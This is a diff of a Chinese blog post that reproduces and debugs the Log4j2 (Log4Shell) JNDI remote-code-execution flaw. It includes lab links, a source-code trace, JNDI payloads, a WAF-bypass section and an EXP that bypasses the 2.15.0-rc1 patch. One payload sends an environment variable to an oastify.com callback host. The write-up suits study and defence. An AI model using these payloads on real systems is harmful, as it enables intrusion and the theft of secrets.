@@ -299,9 +299,9 @@
 <p>看到网上烂的文章还是有一部分，决定自己写一篇，深入理解一下 log4j2 的 RCE</p>
 </blockquote>
 <p>一些个靶场</p>
-<p><a class="link"   target="_blank" rel="noopener" href="http://d63bb2586.lab.aqlab.cn/" >掌控安全<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="http://vulfocus.fofa.so/#/dashboard" >首页 - vulfocus<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/christophetd/log4shell-vulnerable-app" >log4shell-vulnerable-app<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="http://d63bb2586.lab.aqlab.cn/">掌控安全<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="http://vulfocus.fofa.so/#/dashboard">首页 - vulfocus<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/christophetd/log4shell-vulnerable-app">log4shell-vulnerable-app<i class="fas fa-external-link-alt"></i></a></p>
 <h1 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul>
 <li>忍不住想先学一学 Log4j2 的漏洞，结果上网一查资料，看到一些资料感觉写的不太清楚，于是自己提笔来写一篇 ~</li>
 </ul>
@@ -334,7 +334,7 @@
 <ul>
 <li>跑起来是这个样子</li>
 </ul>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/RunCode.png" class>
 
 <h3 id="实际开发场景"><a href="#实际开发场景" class="headerlink" title="实际开发场景"></a>实际开发场景</h3><p>现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话，是这样的。</p>
 <p>比如我从数据库获取到了一个 username 为 “Drunkbaby”，我要把它登录进来的信息打印到日志里面，这个路径一般有一个 &#x2F;logs 的文件夹的。</p>
@@ -342,17 +342,17 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.function.LongFunction;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RealEnv</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line"> <span class="keyword">if</span> (username != <span class="literal">null</span>) &#123;  </span><br><span class="line">            logger.info(<span class="string">&quot;User &#123;&#125; login in!&quot;</span>, username);  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">else</span> &#123;  </span><br><span class="line">            logger.error(<span class="string">&quot;User &#123;&#125; not exists&quot;</span>, username);  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>Run 一下</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/RealEnv.png" class>
 
 <p>当然实际场景里面肯定不会是判断 null，肯定是和 mybatis 数据库这种结合起来使用的，具体的 demo 我就不写了，仅仅知道开发流程就可以了。</p>
 <h2 id="0x03-Log4j2-漏洞分析"><a href="#0x03-Log4j2-漏洞分析" class="headerlink" title="0x03 Log4j2 漏洞分析"></a>0x03 Log4j2 漏洞分析</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.x &lt;&#x3D; log4j &lt;&#x3D; 2.15.0-rc1</p>
 <h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们可以看到在 <code>logger.info(&quot;User &#123;&#125; login in!&quot;, username);</code> 的这个地方，实际上 ———— username 这个参数是可控的。我输入 username 确实是用户可控的。</p>
 <p>那么这里，我们尝试输入一下其他的呢？</p>
 <p>我们将 username 修改为 <code>String username = &quot;$&#123;java:os&#125;&quot;;</code>，再跑一下看看。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/OS.png" class>
 
 <p>这里并不是打印出了 “Hello, $java:os”，而是打印出了我们操作系统的一些信息。这里的设计看上去就有非常大的问题，官方文档的意思是这是 log4j2 自带的一个功能。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookup.png" class>
 
 <p>其实如果按照官网上面的那几个 api 来看，其实不太严重，最多也就是日志与我们输入对不上而已，并不是会引起大的安全漏洞。</p>
 <ul>
@@ -366,7 +366,7 @@
 
 <p>然后要开启 RMIServer，因为之前有代码，这里就不放了。</p>
 <p>成功</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/RunCode.png" class>
 
 <h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
 <li>这里我觉得还是会走到原生的 RMI 里面的 lookup 方法去的。</li>
@@ -375,62 +375,62 @@
 <p>调试会有点难度，而且会有很多遍的各种调用，因为日志第一行是 <code>&#123;pattern1&#125;</code> 还有 <code>&#123;pattern2&#125;</code>；后续还有日期的那些信息，到最后才是我们的输入。<br>所以要把断点找好，一直 f9 比较节省时间。</p>
 </blockquote>
 <p>不要直接调试，我们下个断点在 <code>PatternLayout</code> 这个类下的 <code>toSerializable()</code> 方法。因为前面的调试很多都是在转来转去，这样太浪费时间了。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Point.png" class>
 
 <p>往下走，先是一个循环，遍历 <code>formatters</code> 一段一段的拼接输出的内容，不是很重要。</p>
 <p>两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffer。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/formatters.png" class>
 
 <p>跟进 <code>format()</code> 方法，这个 <code>format()</code> 方法师傅们可以把它当作是处理字符串的一个方法，具体如何处理是根据具体情况重写的。当时自己学习的时候就一直纠结的这个，其实没必要。</p>
 <p>因为这是一个循环来遍历 <code>formatters</code> 的，中间会做很多数据处理的工作，这都不重要，但是有一个地方特别重要，我这里当 i &#x3D; 7 的时候进入到了另外的一个 format 处理方法，如图。</p>
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/format01.png" class>
 
-
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/format02.png" class>
 
 <p>其实 event 还是同一个，这里循环到底是什么逻辑我也搞不清楚，如果有了解的师傅还请指点一下 ~</p>
 <ul>
 <li>当我们进到这个 <code>format()</code> 方法里面之后，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。</li>
 </ul>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/JudgeLookups.png" class>
 
 <p>继续往下走，会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在 <code>$&#123;</code> ，那么就会取出从 $ 开始知道最后的字符串，这一步(这里的日志其实有很长，我们看 logs 文件夹是可以看到的，是一条条读取出来的)</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/payload.png" class>
 
 <p>workingBuilder 的内容如下，其实结构也比较清晰方法名，日志级别，当前类名，然后就是我们的 payload</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/workinigBuilder.png" class>
 
 <p>所以上图的 value 就是我们输入的 payload <code>$&#123;jndi:ldap://127.0.0.1:1389/Calc&#125;</code></p>
 <p>跟进 <code>replace()</code> 方法，<code>replace()</code> 方法里面调用了 <code>substitute()</code> 方法</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/substitute.png" class>
 
 <p>跟进之后 f7 进入到这里</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/substituteIn.png" class>
 
 <p>继续往下走，直到这个 while 循环里面，在 while 循环中，会对字符进行逐字匹配 <code>$&#123;</code></p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/chars.png" class>
 
 <p>然后进行循环读取，知道读取到 } 并获取其坐标，然后将 ${} 中间的内容取出来，然后又会调用 <code>this.subtitute</code> 来处理。</p>
 <p>这里会多次进入这个过程，说真的挺头疼的，不用管其他流程，我们就关注这个 <code>$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;</code> 的值即可</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/GetValue.png" class>
 
 <p>再次运行 subtitue 的时候由于我们已没有 ${ } 所以就直接来到下面，将 varName 作为变量传入了 resolveVariable 函数</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/resolveVariable.png" class>
 
 <p>varName 就是为 ${} 中的值</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/varName.png" class>
 
 <p>可以猜测<code>resolver</code>解析时支持的关键词有<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>，而我们这里利用的<code>jndi:xxx</code>后续就会用到<code>JndiLookup</code>这个解析器</p>
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Keyword.png" class>
 
-
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Keyword02.png" class>
 
 <p>这里我们看到 <code>resolveVariable()</code> 方法里面是调用了 <code>lookup()</code> 方法，这个 <code>lookup()</code> 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的 <code>lookup()</code> 方法的，是存在漏洞的。</p>
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookupHole.png" class>
 
-
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/jndiLookup.png" class>
 
 <p>再可以往里跟一下</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/NormalJndi.png" class>
 
 <ul>
 <li>再往下走就是 JNDI 常规的注入了，分析过程到此结束。</li>
@@ -444,7 +444,7 @@
 <li>出发点是基于很多 WAF 检测是否存在 <code>jndi:</code> 等关键词进行判断，下面我们讲一讲绕过手法。</li>
 </ul>
 <p> 根据官方文档中的描述，如果参数未定义，那么 <code>:-</code> 后面的就是默认值，通俗的来说就是默认值</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Doc.png" class>
 
 <h3 id="1-利用分隔符和多个-绕过"><a href="#1-利用分隔符和多个-绕过" class="headerlink" title="1. 利用分隔符和多个 ${} 绕过"></a>1. 利用分隔符和多个 <code>$&#123;&#125;</code> 绕过</h3><ul>
 <li>例如这个 payload</li>
@@ -483,14 +483,14 @@
 <p>举个例子</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//$&#123;env:LOGNAME&#125;.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com&#125;</span></span><br></pre></td></tr></table></figure>
 
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/envLogName.png" class>
 
-
-<p>我这里本地利用失败了，还有浅蓝师傅提出来的读取 classpath 的敏感信息的利用方式 ———— <a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1677" >http://wjlshare.com/archives/1677<i class="fas fa-external-link-alt"></i></a></p>
+<p>我这里本地利用失败了，还有浅蓝师傅提出来的读取 classpath 的敏感信息的利用方式 ———— <a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1677">http://wjlshare.com/archives/1677<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="0x07-Log4j2-2-15-0-漏洞修复与绕过"><a href="#0x07-Log4j2-2-15-0-漏洞修复与绕过" class="headerlink" title="0x07 Log4j2 2.15.0 漏洞修复与绕过"></a>0x07 Log4j2 2.15.0 漏洞修复与绕过</h2><blockquote>
 <p>说实话，挺鸡肋的，而且受操作系统影响，Windows 无法复现成功，师傅们可以看一下思路，不用跟着复现。</p>
 </blockquote>
 <h3 id="1-初窥-log4j-2-15-0-版本的修复"><a href="#1-初窥-log4j-2-15-0-版本的修复" class="headerlink" title="1. 初窥 log4j 2.15.0 版本的修复"></a>1. 初窥 log4j 2.15.0 版本的修复</h3><p>官方给出了 CVE 编号和补丁，升级到了 2.15.0 之后默认不开启 JNDI Lookup</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/2150Repair.png" class>
 
 <p>漏洞修复主要是在 JndiManager#lookup 中增加了代码，因为最终的触发点就是这里，我们可以先跑一下之前的 2.14.1 里面攻击的 EXP</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.layout.PatternLayout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.function.LongFunction;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OriginalEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"> logger.error(<span class="string">&quot;User &#123;&#125; login in!&quot;</span>, username);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -502,10 +502,10 @@
 <ul>
 <li>因为我前文说过，toSerializable 这里会读取日志的全部部分，所以一开始是什么 <code>[ERROR]</code> 那些的。所以我们要走到读取 payload 的地方。如图所示，2.14.1 类是 <code>MessagePatternConverter</code>，2.15.0 是 <code>MessagePatternConverter.SimplePatternConverter</code></li>
 </ul>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/diffConverter.png" class>
 
 <p>这里 2.14.1 的版本会进行 <code>$&#123;&#125;</code> 的判断，而 2.15.0 的版本会直接把它 toAppendTo 进去。注意！这是同一个类的 format 方法，由此可见，此处是 2.15.0 版本的修复点之一。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/diffMessageFormat.png" class>
 
 <ul>
 <li>2.15.0 版本的 log4j 包还在 <code>JndiManager#lookup</code> 中增加了代码，不过我们现在得先走到那里面进去再去分析。现在应该想办法走进 <code>JndiManager#lookup</code>。</li>
@@ -515,19 +515,19 @@
 <li>按照我们上面所分析的，难道就没有办法进入到 <code>lookup()</code> 进行攻击了吗？</li>
 </ul>
 <p>其实不是这样的，我们在 <code>MssagePatternConverter</code> 这个类里面找之前 2.14.1 版本中的调用语句：<code>config.getStrSubstitutor().replace(event, value)</code>。结果是找到一个非常非常类似的语句，位置如图所示</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/replaceIn.png" class>
 
 <p>点进去看 <code>replaceIn()</code> 方法，它所属的类是 <code>StrSubstitutor</code>，这和我们在 2.14.1 里面分析的是一样的过程。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/StrSubstitutorReplaceIn.png" class>
 
 <p>那么回来看调用 <code>replaceIn()</code> 方法的 <code>format()</code> 方法是隶属于 <code>LookupMessagePatternConverter</code> 这个类的，而这个类继承了 <code>MessagePatternConverter</code>；如果我们要进到 <code>LookupMessagePatternConverter</code> 这个类里面去，需要满足前文提到的 <code>Converter</code> 为 <code>LookupMessagePatternConverter</code> 这个类。</p>
 <p>但是怎么样才能让 <code>converter</code> 的类变成 <code>LookupMessagePatternConverter</code>，而不是 <code>SimpleMessagePatternConverter</code> 呢？</p>
-<p>（一开始这里自己分析不下去了，看<a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1674" >天下大木头师傅<i class="fas fa-external-link-alt"></i></a>的文章才知道是怎么解决的）</p>
+<p>（一开始这里自己分析不下去了，看<a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1674">天下大木头师傅<i class="fas fa-external-link-alt"></i></a>的文章才知道是怎么解决的）</p>
 <p>在 <code>newInstance()</code> 方法中会调用 <code>loadLookups()</code> 这个方法，在 <code>loadLookups()</code> 方法中会根据 <code>if (LOOKUPS.equalsIgnoreCase(option))</code> 的结果来判断是哪一个 Converter，我们可以在这里打个断点。发现是要满足两个条件才可以，如图。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/TwoFactors.png" class>
 
 <p>在经过多次尝试之后，发现其实限制因素其实都是需要我们手动去修改的，在实际渗透的时候不可能会遇到这种情况，如图。</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/lookupValueJudge.png" class>
 
 <blockquote>
 <p>所以这也是补丁绕过比较鸡肋的地方</p>
@@ -545,26 +545,26 @@
 <p>这时候会成功进入到 <code>JndiManager#lookup</code> 里面去，这个方法在相较于 2.14.1 还是变化非常非常大的。</p>
 </blockquote>
 <p>在这里做了很多限制，一个一个来看</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/2150Change.png" class>
 
 <p>在最开始的 this.allowedProtocols 为 {java,ldap,ldaps} 我们的 ldap 在其中，所以会继续</p>
 <p>接下来就是 this.allowedHosts 的限制，这个限制的非常死，只允许本地host</p>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/hosts.png" class>
 
 <p>后面还有对 javaSerializedData 中的 classname 做了处理；以及 Reference 和 javaFactory 做了处理，也就是对 JDNI 注入做了处理，师傅们可以去木头师傅的博客观看 ~</p>
 <ul>
 <li>但是其实最终的绕过的话，是因为抛出异常这里没有进行限制，所以我们传入的 Payload 可以是这样：<code>&quot;$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;&quot;</code>，也就是多个空格，就可以进入到 <code>catch</code> 里面绕过</li>
 </ul>
-
+<img src="/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/Space.png" class>
 
 <p>完整 EXP 如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.LogEvent;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.Configuration;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.DefaultConfiguration;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.impl.MutableLogEvent;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.pattern.MessagePatternConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.function.LongFunction;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 绕过 rc1 的 EXP，Windows 无法触发  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRc1EXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfiguration</span>();  </span><br><span class="line"> <span class="type">MessagePatternConverter</span> <span class="variable">messagePatternConverter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(configuration,  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;lookups&quot;</span>&#125;);  </span><br><span class="line"> <span class="type">LogEvent</span> <span class="variable">logEvent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MutableLogEvent</span>(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line"> messagePatternConverter.format(logEvent,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;&quot;</span>));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.ddosi.org/activescan/" >burpsuite主动扫描插件之ActiveScan++<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan" >Log4j2 RCE Passive Scanner plugin for BurpSuite<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/pmiaowu/log4j2Scan" >用于帮助企业内部快速扫描log4j2的jndi漏洞的burp插件<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/f0ng/log4j2burpscanner" >f0ng&#x2F;log4j2burpscanner<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html" >http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1674" >http://wjlshare.com/archives/1674<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1677" >http://wjlshare.com/archives/1677<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649" >https://xz.aliyun.com/t/10649<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10689#toc-0" >https://xz.aliyun.com/t/10689#toc-0<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E7%B1%BB%E5%AE%8C%E6%88%90challenge" >https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E7%B1%BB%E5%AE%8C%E6%88%90challenge<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.ddosi.org/activescan/">burpsuite主动扫描插件之ActiveScan++<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan">Log4j2 RCE Passive Scanner plugin for BurpSuite<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/pmiaowu/log4j2Scan">用于帮助企业内部快速扫描log4j2的jndi漏洞的burp插件<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/f0ng/log4j2burpscanner">f0ng&#x2F;log4j2burpscanner<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html">http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1674">http://wjlshare.com/archives/1674<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1677">http://wjlshare.com/archives/1677<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649">https://xz.aliyun.com/t/10649<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10689#toc-0">https://xz.aliyun.com/t/10689#toc-0<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E7%B1%BB%E5%AE%8C%E6%88%90challenge">https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E7%B1%BB%E5%AE%8C%E6%88%90challenge<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
